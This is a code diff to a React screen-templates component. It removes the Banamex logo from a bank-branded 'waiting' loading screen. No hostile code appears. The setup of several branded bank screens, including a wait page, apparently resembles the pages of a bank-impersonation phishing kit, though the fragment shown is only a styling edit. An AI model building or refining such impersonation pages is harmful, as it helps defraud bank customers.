@@ -3276,11 +3276,6 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         const banamexWaitingContent = (
           <div style={{ margin: 0, fontFamily: '"Helvetica Neue", Arial, sans-serif', background: '#ffffff', color: '#0b2a2d', WebkitFontSmoothing: 'antialiased', MozOsxFontSmoothing: 'grayscale', minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '20px' }}>
             <div style={{ maxWidth: '500px', textAlign: 'center' }}>
-              {/* Logo de Banamex */}
-              <div style={{ marginBottom: '32px' }}>
-                <img src="/banamex/images/logobanamex.svg" alt="Banamex" style={{ width: '150px', margin: '0 auto', display: 'block' }} />
-              </div>
-
               {/* Gif de carga */}
               <div style={{ marginBottom: '32px' }}>
                 <img 
